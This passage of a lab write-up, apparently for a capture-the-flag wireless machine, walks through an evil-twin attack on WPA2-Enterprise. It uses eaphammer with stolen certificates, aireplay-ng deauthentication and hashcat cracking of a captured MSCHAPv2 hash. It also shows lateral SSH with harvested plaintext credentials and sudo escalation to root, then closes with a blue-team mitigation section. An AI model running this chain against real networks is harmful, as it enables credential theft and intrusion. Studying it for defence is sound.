wpa_pairwise=TKIP CCMP
wpa_passphrase="XX3e7CugmAwtc5HV5KqnkYx27"

====================
psk/hostapd_other2.conf
====================
interface=wlan10
driver=nl80211
hw_mode=g
channel=1
ssid=vodafoneFB6N
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
wpa_passphrase="obwk4PxNRY7HZcStaP4LELhpF"

====================
psk/hostapd_other3.conf
====================
interface=wlan11
driver=nl80211
hw_mode=g
channel=9
ssid=MiFibra-24-D4VY
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase="TYYHbhajPnHxcHuCt2d3xRyMK"
```

- 🔍 *While Looking At send_certs.sh*

```bash
#!/bin/bash
# DO NOT COPY
# Script to sync certs-backup folder to AirTouch-office.

# Define variables
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
REMOTE_PATH="~/certs-backup/"
LOCAL_FOLDER="/root/certs-backup/"

# Use sshpass to send the folder via SCP
sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH"
```

- 🔍 *it is a sort of bash script that Copies the cert-backup files to a remote user at 10.10.10.1 (AirTouch-office gateway)*
- 🔍 *Interesting Findings, we have got the Creds for remote user*
  - **User:** remote
  - **Password:** xGgWEwqUpfoOVsLeROeG

> [!IMPORTANT]
> **Attack Plan:**
> - We have a target and Creds to Attack with
> - First We need To Create an Evil-Twin AP 
> - Then We Force a Client to Reconnect 
> - And Will Capture the Creds
> 
> The Password can be:
> - plaintext creds (rare)
> - MSCHAPv2 challenge/response (common)

> [!NOTE]
> **MSCHAPv2 Challenge/Response Mechanism:**
> MSCHAPv2 (Microsoft Challenge Handshake Authentication Protocol version 2) is a password-based authentication protocol designed by Microsoft to verify user identity over network connections, such as VPNs (PPTP) or Wi-Fi (WPA2-Enterprise). It uses a secure "challenge-response" mechanism to authenticate without sending the actual password over the network.
> 
> **How MSCHAPv2 Challenge/Response Works:**
> 1. **Challenge:** The server sends a random string (challenge) to the client.
> 2. **Response:** The client hashes their password with the challenge and sends the result (response) back.
> 3. **Verification:** The server compares the response with its own calculation to validate the user.
> 4. **Mutual Authentication:** Unlike older versions, MSCHAPv2 allows the client to also verify the server’s identity.

- 🔍 *As We Know Its a Corporate Wifi Network,*
  - WPA2-Enterprise
  - 802.1X authentication
  - EAP methods (PEAP/TTLS/TLS)
  - backed by RADIUS
- 🔍 *So Instead of PSKs(pre-shared keys) User will try to Authenticate with username and Password*

---

### Execution

- 🔍 *Lets First Check On what Channel AirTouch-Office is Operating ON:-*

```bash
iw dev wlan3 scan | sed -n '/SSID: AirTouch-Office/,+25p'
```

```text
       SSID: AirTouch-Office
       Supported rates: 6.0* 9.0 12.0* 18.0 24.0* 36.0 48.0 54.0
       DS Parameter set: channel 44
       Country: ES     Environment: Indoor/Outdoor
               Channels [36 - 48] @ 23 dBm
               Channels [149 - 169] @ 13 dBm
       RSN:     * Version: 1
                * Group cipher: CCMP
                * Pairwise ciphers: CCMP
                * Authentication suites: IEEE 802.1X
                * Capabilities: 16-PTKSA-RC 1-GTKSA-RC (0x000c)
       Extended capabilities:
                * Extended Channel Switching
                * Multiple BSSID
                * SSID List
                * Operating Mode Notification
       WMM:     * Parameter version 1
                * BE: CW 15-1023, AIFSN 3
                * BK: CW 127-32767, AIFSN 7
                * VI: CW 32767-32767, AIFSN 3, TXOP 3008 usec
                * VO: CW 32767-32767, AIFSN 7, TXOP 1504 usec
BSS ac:8b:a9:f3:a1:13(on wlan3)
       last seen: 14602.456s [boottime]
       TSF: 1768736686013647 usec (20471d, 11:44:46)
       freq: 5220
       beacon interval: 100 TUs
       SSID: AirTouch-Office
       Supported rates: 6.0* 9.0 12.0* 18.0 24.0* 36.0 48.0 54.0
       DS Parameter set: channel 44
       Country: ES     Environment: Indoor/Outdoor
               Channels [36 - 48] @ 23 dBm
               Channels [149 - 169] @ 13 dBm
       RSN:     * Version: 1
                * Group cipher: CCMP
                * Pairwise ciphers: CCMP
                * Authentication suites: IEEE 802.1X
                * Capabilities: 16-PTKSA-RC 1-GTKSA-RC (0x000c)
       Extended capabilities:
                * Extended Channel Switching
                * Multiple BSSID
                * SSID List
                * Operating Mode Notification
       WMM:     * Parameter version 1
                * BE: CW 15-1023, AIFSN 3
                * BK: CW 127-32767, AIFSN 7
                * VI: CW 32767-32767, AIFSN 3, TXOP 3008 usec
                * VO: CW 32767-32767, AIFSN 7, TXOP 1504 usec
```

- 🔍 *The Channel is 44, and there is no crackable PSK*
- 🔍 *Lets Monitor Channel 44*

```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
airodump-ng -c 44 wlan0
```

```text
CH 44 ][ Elapsed: 54 s ][ 2026-01-18 12:03 ][ WPA handshake: AC:8B:A9:AA:3F:D2 
 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 AC:8B:A9:F3:A1:13  -28 100      561        0    0  44   54e  WPA2 CCMP   MGT  AirTouch-Offic
 AC:8B:A9:AA:3F:D2  -28 100      561       52    0  44   54e  WPA2 CCMP   MGT  AirTouch-Offic
 66:A4:A1:1E:5E:97  -28 100      562        0    0   1   54        TKIP   PSK  vodafoneFB6N  
 
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 AC:8B:A9:AA:3F:D2  28:6C:07:12:EE:A1  -29    6e- 6e     0       33  PMKID  AirTouch-Office
 AC:8B:A9:AA:3F:D2  28:6C:07:12:EE:F3  -29    6e- 6e     0       40  PMKID  AirTouch-Office
 AC:8B:A9:AA:3F:D2  C8:8A:9A:6F:F9:D2  -29    0 -48e     0        8         AirTouch-Office
```

- 🔍 *APs with Same SSID*
  - AC:8B:A9:F3:A1:13 --> AirTouch-Office
  - AC:8B:A9:AA:3F:D2 --> AirTouch-Office
- 🔍 *Clients*
  - 28:6C:07:12:EE:A1 --> PMKID
  - 28:6C:07:12:EE:F3 --> PMKID
  - C8:8A:9A:6F:F9:D2 --> Normal Traffic

> [!NOTE]
> **PMKID Definition:**
> PMKID (Pairwise Master Key Identifier) is a client device that supports PMK caching, allowing it to store a PMK (Pairwise Master Key) from a previous session and reuse it to reconnect to the same network.

- 🔍 *So when we force connect a PMKID client, Then That user will use it PMK(Pairwise Master key) To re-connect to the network. If somehow we can get that PMK, We can get into the network*
- 🔍 *Lets First Copy All the Certs and Keys From AirTouch-Internet to Consultant, Cause Consultant has eaphammer*

```bash
# use password: RxBlZhLmOkacNWScmZ6D
scp /root/certs-backup/ca.crt consultant@192.168.3.46:/tmp/ca.crt
scp /root/certs-backup/server.crt consultant@192.168.3.46:/tmp/server.crt
scp /root/certs-backup/server.key consultant@192.168.3.46:/tmp/server.key
```

- 🔍 *On Consultant(root), Import Those Certs in eaphammer*

```bash
cd /root/eaphammer
./eaphammer --cert-wizard import \
            --server-cert /tmp/server.crt \
            --private-key /tmp/server.key \
            --ca-cert /tmp/ca.crt
```

```text
                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/


                       Now with more fast travel than a next-gen Bethesda game. >:D

                            Version:  1.14.0
                           Codename:  Final Frontier
                             Author:  @s0lst1c3
                            Contact:  gabriel<<at>>transmitengage.com


[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
Case 1: Import all separate
[CW] Ensuring server cert, CA cert, and private key are valid...
/tmp/server.crt
/tmp/server.key
/tmp/ca.crt
[CW] Complete!
[CW] Loading private key from /tmp/server.key
[CW] Complete!
[CW] Loading server cert from /tmp/server.crt
[CW] Complete!
[CW] Loading CA certificate chain from /tmp/ca.crt
[CW] Complete!
[CW] Constructing full certificate chain with integrated key...
[CW] Complete!
[CW] Writing private key and full certificate chain to file...
[CW] Complete!
[CW] Private key and full certificate chain written to: /root/eaphammer/certs/server/AirTouchCA.pem
[CW] Activating full certificate chain...
[CW] Complete!
```

- 🔍 *Now Lets Create a Fake Rogue AP*

```bash
./eaphammer \
  --interface wlan4 \
  --channel 44 \
  --essid "AirTouch-Office" \
  --auth wpa-eap \
  --creds \
  --karma
```

```text
[ ... snip ... ]
[*] Success: wlan4 no longer controlled by NetworkManager.
[!] The hw_mode specified in hostapd.ini is invalid for the selected channel (g, 44)
[!] Falling back to hw_mode: a
[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-01-19-00-28-35-mc0IZDwJtjdQ4xJvVntdu45hDyBtwS9C.hccapx

[hostapd] AP starting...

Configuration file: /root/eaphammer/tmp/hostapd-2026-01-19-00-28-35-2V64be14H1Q3KjSwNhb8b0TPLMsEniFG.conf
rfkill: Cannot open RFKILL control device
wlan4: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan4 with hwaddr 00:11:22:33:44:00 and ssid "AirTouch-Office"
wlan4: interface state COUNTRY_UPDATE->ENABLED
wlan4: AP-ENABLED

Press enter to quit...
```

- 🔍 *It is listening for targets to reconnect*
- 🔍 *Deauth Attack on Real Clients, Force a re-connect*

```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
# hard-lock wlan0 channel before injection
iw dev wlan0 set channel 44
```

- 🔍 *First Do a Broadcast Deauth.*

```bash
aireplay-ng -0 10 -a AC:8B:A9:AA:3F:D2 wlan0
```

> [!NOTE]
> These are the real PMKID Clients.

```bash
aireplay-ng -0 10 -a AC:8B:A9:F3:A1:13 wlan0
```

- 🔍 *Once a Station appears, then do targeted deauth*

```bash
aireplay-ng -0 10 -a AC:8B:A9:AA:3F:D2 -c 28:6C:07:12:EE:F3 wlan0
```

- 🔍 *We have Captured Something on The eaphammer*

```text
[ … snip … ]
        challenge:                     f4:de:34:71:68:c9:8b:ac
        response:                      28:ac:0d:f7:79:7e:70:ac:8e:db:d0:db:4a:74:4a:89:c9:33:af:19:df:99:57:32

        jtr NETNTLM:                   r4ulcl:$NETNTLM$f4de347168c98bac$28ac0df7797e70ac8edbd0db4a744a89c933af19df995732

        hashcat NETNTLM:               r4ulcl::::28ac0df7797e70ac8edbd0db4a744a89c933af19df995732:f4de347168c98bac


wlan4: CTRL-EVENT-EAP-FAILURE 28:6c:07:12:ee:f3
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: deauthenticated due to local deauth request
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: authenticated
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: associated (aid 1)
wlan4: CTRL-EVENT-EAP-STARTED 28:6c:07:12:ee:f3
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
```

- 🔍 *Well We got a NENTLM Hash*

> [!NOTE]
> **PEAP-MSCHAPv2 Integration:**
> MSCHAPv2 (Microsoft Challenge Handshake Authentication Protocol version 2) and PEAP (Protected Extensible Authentication Protocol) are tightly coupled in enterprise network security, often referred to as PEAP-MSCHAPv2. PEAP serves as the secure, encrypted "tunnel" (outer layer) that protects the MSCHAPv2 authentication process (inner layer), which typically uses NTLM (or NT hashes) to verify user credentials against a Microsoft Active Directory database.

- 🔍 *Lets Crack the hash*

```text
hashcat 	mode
Net-NTLMv1	5500
```

```bash
cat > mschapv2.hash << 'EOF'
r4ulcl::::d3b5c9b9247d754d6a5dcc0757b219e7b799f588cf11b3f2:8ef004bc2ccbcca4
EOF
hashcat -m 5500 -a 0 mschapv2.hash /usr/share/wordlists/rockyou.txt --force
```

```text
r4ulcl::::d3b5c9b9247d754d6a5dcc0757b219e7b799f588cf11b3f2:8ef004bc2ccbcca4:laboratory

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
Hash.Target......: r4ulcl::::d3b5c9b9247d754d6a5dcc0757b219e7b799f588c...cbcca4
```

- 🔍 *Credential recovered: r4ulcl / laboratory*
- 🔍 *Now Just Like We Jumped To The AirTouch-Internet with key challenge, The same way we can jump to AirTouch-Office with key laboratory.*

```bash
# 1) bring up any unused vlan on client (consultant), e.g., 6
ip link set wlan6 up
# verify
iw dev wlan6 info
```

```bash
# 2) create PEAP config with identity including domain
cat > /tmp/office.conf <<'EOF'
network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
}
EOF
```

```bash
# 3) connect
wpa_supplicant -B -D nl80211 -i wlan6 -c /tmp/office.conf
# 4) get DHCP lease
dhclient -v wlan6
# 5) verify
ip -br a | grep wlan6
```

```text
wlan6            UP             10.10.10.38/24 fe80::ff:fe00:600/64
```

- 🔍 *We are now inside the Corporate Network*
- 🔍 *We Have Discovered Creds for a remote user from send_Certs.sh*
  - **remote / xGgWEwqUpfoOVsLeROeG** (Note: password adjusted from export typo)

- 🔍 *Lets SSH:-*

```bash
ssh remote@10.10.10.1
```

```text
The authenticity of host '10.10.10.1 (10.10.10.1)' can't be established.
ECDSA key fingerprint is SHA256:/lSCXr95A71FBCcQ9DT1xXMFeCAsLEnCUfSwu/3qPoE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.1' (ECDSA) to the list of known hosts.
remote@10.10.10.1's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

remote@AirTouch-AP-MGT:~$ id
uid=1000(remote) gid=1000(remote) groups=1000(remote)

remote@AirTouch-AP-MGT:~$ ls /home
admin  remote
```

- 🔍 *While Enumerating We can See there is file /etc/hostapd/hostapd_wpe.eap_user is literally the Phase2 credential database for the used inside PEAP.*

```bash
# hostapd user database for integrated EAP server
[ ... snip ...]

# WPE - DO NOT REMOVE - These entries are specifically in here
*       PEAP,TTLS,TLS,FAST
#"t"    TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2  "t"     [2]

*       PEAP,TTLS,TLS,FAST [ver=1]
#"t"    GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "password" [2]

"AirTouch\r4ulcl"       MSCHAPV2        "laboratory" [2]
"admin"                 MSCHAPV2        "xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]
```

- 🔍 *And We got the Creds for **admin:xMJpzXt4D9ouMuL3JJsMriF7KZozm7***

- 🔍 *Grab The Root Flag:-*

```bash
remote@AirTouch-AP-MGT:/tmp$ su admin
```

```text
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

```bash
admin@AirTouch-AP-MGT:/tmp$ sudo -l
```

```text
Matching Defaults entries for admin on AirTouch-AP-MGT:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:...

User admin may run the following commands on AirTouch-AP-MGT:
    (ALL) ALL
    (ALL) NOPASSWD: ALL
```

```bash
admin@AirTouch-AP-MGT:/tmp$ sudo su
root@AirTouch-AP-MGT:/tmp# id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@AirTouch-AP-MGT:/tmp# cat /root/root.txt
```

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Wireless & Network Infrastructure Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the AirTouch lab. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Plaintext Information Disclosure in Public SNMP Service

> [!WARNING]
> **Vulnerability Profile:**
> The SNMP daemon on port `161/udp` is exposed with the weak, default community string `public` and contains sensitive cleartext credentials (the default consultant password) inside its system description metadata.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> SNMP services with weak community strings are heavily targeted for information gathering. Anyone on the local segment or network loop can query metadata tables to extract system parameters, running processes, interface statistics, or in this case, cleartext administrator passwords, achieving immediate initial access.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Strictly configure SNMP community strings to use long, randomized strings. Avoid using default values like `public` or `private`.
> - **Remediation:** Migrate from SNMPv1/v2c to **SNMPv3**, which enforces cryptographic authentication and session encryption.
> - **Remediation:** Implement local firewall rules or Access Control Lists (ACLs) to strictly block SNMP ports (`161/udp`, `162/udp`) from unauthorized external subnets, allowing queries exclusively from specific network monitoring engines.
> - **Detection:** Set up alerts in SIEM systems for SNMP scan traffic or read queries originating from non-authorized administrative IP subnets.

---

### 🔴 Unsafe Storage of Cleartext Credentials in Scripts & System Files

> [!WARNING]
> **Vulnerability Profile:**
> Administrative and deployment scripts (such as `send_certs.sh`) store remote SCP synchronization passwords in plain text. Similarly, local wireless configs (`hostapd_other*.conf` and `hostapd_wpa.conf`) contain plain text passphrases.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Hardcoding cleartext credentials inside local directories makes any compromised low-privilege account or simple web-shell injection highly dangerous. Attackers can parse local system folders to instantly harvest active administrative accounts, facilitating immediate lateral movement and remote host compromise without triggering traditional authentication alerts.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Remove hardcoded passwords from scripts. Utilize secure configuration management keys, environment variables, or local credential stores (e.g., HashiCorp Vault, Keyrings) to load passwords dynamically during processing.
> - **Remediation:** Lockdown access permissions to critical configuration repositories. Restrict configuration paths (`psk/`, `/etc/hostapd/`) to `root:root` ownership with permissions set strictly to `600` (readable and writable only by root).
> - **Detection:** Integrate automated static analysis code scanning tools (such as TruffleHog, GitGuardian, or custom audit rules) into regular build tracks to detect accidental cleartext credential storage.

---

### 🔴 WPA2-Enterprise Rogue AP / Evil Twin Authentication Harvesting (PEAP-MSCHAPv2)

> [!WARNING]
> **Vulnerability Profile:**
> The enterprise corporate Wi-Fi infrastructure (`AirTouch-Office`) relies on PEAP-MSCHAPv2 authentication. Because local clients do not enforce strict server certificate verification, they can be forced to associate with a rogue hostapd access point, exposing dynamic MSCHAPv2 challenge/response hashes.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> If client endpoints are not explicitly configured to validate RADIUS server certificates, they will readily connect to any rogue access point broadcasting the corporate ESSID on an overlapping channel. Once connected, the rogue AP captures the client's inner-tunnel MSCHAPv2 response, allowing attackers to perform rapid offline dictionary attacks to crack passwords and jump directly into corporate core segments.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Force strict **Server Certificate Validation** on all corporate client devices via Group Policy Objects (GPO) or MDM configurations. Configure wireless profiles to only trust designated enterprise Root Certificate Authorities (CAs) and explicitly define authorized RADIUS server names.
> - **Remediation:** Disable the client-side option to prompt users to trust new servers or certificates during association failures.
> - **Remediation:** Deploy a robust **Wireless Intrusion Prevention System (WIPS)** to continuously monitor the RF spectrum. Configure alerts to identify and dynamically block rogue AP signatures, deauthentication floods, and conflicting MAC allocations.
> - **Detection:** Monitor logs for elevated levels of deauthentication packets or client association timeouts, which often indicate an active evil-twin attack in progress.

---

### 🔴 Unencrypted HTTP Administrative Traffic & Wi-Fi Session Sniffing

> [!WARNING]
> **Vulnerability Profile:**
> The primary administrative router control page is served over plain, unencrypted HTTP (`http://192.168.3.1/`). This allows attackers who have decrypted the local Wi-Fi layer to intercept network traffic.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> In unencrypted HTTP channels, all session identifiers, query parameters, and form payloads are transmitted across the local segment in plain text. Attackers who possess the Wi-Fi key can decrypt 802.11 frames to capture cookie headers (like `PHPSESSID`), bypass authentication filters, and hijack active sessions to perform privileged tasks.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Mandate SSL/TLS across all administration panels. Completely disable port 80 or implement a strict redirect rule pushing traffic to port 443 (HTTPS) with robust, trusted certificates.
> - **Remediation:** Configure secure HTTP cookie parameters: append the `Secure` attribute (limiting cookie transmission exclusively to SSL channels) and the `HttpOnly` attribute (blocking dynamic client-side scripting access).
> - **Detection:** Audit internal subnet flows for plaintext HTTP traffic directed toward administrative interfaces.

---

### 🔴 Incomplete Extension Filtering / Web Shell Upload Bypass

> [!WARNING]
> **Vulnerability Profile:**
> The router's administrative upload module implements a blacklist-based file extension filter to prevent `.php` uploads, which is bypassed by utilizing a `.phtml` script extension.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Blacklist-based extension filters are notoriously fragile. Web servers (such as Apache) are frequently pre-configured to process auxiliary extensions (e.g., `.phtml`, `.php3`, `.php4`, `.php5`, `.phar`, `.shtml`) as active PHP scripts. Bypassing this restriction allows attackers to execute arbitrary system code, spawn shell access, and inherit the privilege levels of the web engine daemon (`www-data`).

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Migrate from file blacklisting to strict **whitelist verification**. Only accept a narrow set of safe document extensions (e.g., `.png`, `.jpg`, `.pdf`).
> - **Remediation:** Store uploaded attachments outside of the dynamic web server root path. Configure the upload folder using local server commands (e.g., Apache's `AllowOverride None` or `RemoveHandler`) to completely disable script interpretation.
> - **Remediation:** Cryptographically rename all uploaded files upon receipt, completely stripping original, user-supplied names to prevent path traversal attempts.
> - **Detection:** Monitor web-accessible upload folders for dynamic script executions or processes generated by the web server daemon.

---

### 🔴 Loose Directory Permissions on Vital RADIUS User Databases

> [!WARNING]
> **Vulnerability Profile:**
> The PEAP integrated EAP user database file `/etc/hostapd/hostapd_wpe.eap_user` is stored with weak directory access permissions, exposing plaintext passwords and active administrative credentials.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Leaving user database directories readable to lower-level accounts presents a severe risk. Attackers who compromise single access point hosts can instantly harvest all enterprise accounts and domain administration keys, resulting in systemic compromise of the entire organization.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Apply rigid access permissions to user databases. Secure hostapd credential directories to `root:root` with permissions set strictly to `600`.
> - **Remediation:** Integrate corporate authentication structures with centralized secure directories (such as Active Directory or LDAP) rather than maintaining local, plain-text credential pools on individual edge access point devices.
> - **Detection:** Run scheduled server audits to verify file permission sets on critical configuration files.
